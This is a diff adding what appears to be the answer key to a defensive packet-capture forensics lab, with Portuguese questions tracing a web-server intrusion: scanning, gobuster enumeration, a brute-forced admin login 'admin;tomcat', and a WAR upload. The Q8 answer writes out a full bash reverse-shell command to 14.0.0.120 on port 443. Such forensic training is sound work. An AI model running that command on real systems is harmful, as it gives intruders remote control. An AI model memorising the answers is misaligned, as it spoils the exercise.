@@ -1,0 +1,28 @@
+Q1
+Dada a suspeita de atividade detectada no servidor web, a análise pcap mostra uma série de interferências em várias portas, indicando um possível comportamento de varredura. Você consegue identificar o endereço IP de origem responsável por iniciar essas interrupções em nosso servidor? 14.0.0.120
+
+Q2
+Com base no endereço IP identificado associado ao invasor, você consegue determinar a cidade de origem das atividades do invasor? Guangzhou
+
+Q3
+A partir da análise do pcap, foram excluídas diversas portas abertas como resultado da verificação da atividade do invasor. Qual dessas portas fornece acesso ao painel de administração do servidor web? 8080
+
+Q4
+Após a descoberta de portas abertas em nosso servidor, parece que o invasor tentou enumerar e descobrir diretórios e arquivos em nosso servidor web. Quais ferramentas você consegue identificar na análise que auxiliou o invasor nesse processo de enumeração? gobuster
+
+Q5
+Após seus esforços para enumerar diretórios em nosso servidor web, o invasor fez inúmeras transações, tentando identificar interfaces administrativas. Qual diretório específico associado ao painel de administração o invasor conseguiu descobrir? /manager
+
+Q6
+Ao acessar o painel de administração, o invasor fez esforço de força brutal nas credenciais de login. A partir dos dados, você consegue identificar a troca correta de nome de usuário e senha que o invasor usou com sucesso para autorização? admin;tomcat
+
+Q7
+Once inside the admin panel, the attacker attempted to upload a file with the intent of establishing a reverse shell. Can you identify the name of this malicious file from the captured data? JXQOZY.war
+
+Q8
+Ao estabelecer um shell reverso em nosso servidor, o invasor teve como objetivo garantir a persistência da máquina comprometida. A partir da análise, você consegue determinar o comando específico que eles estão programados para executar para manter sua presença? /bin/bash -c 'bash -i >& /dev/tcp/14.0.0.120/443 0>&1'
+
+
+
+
+
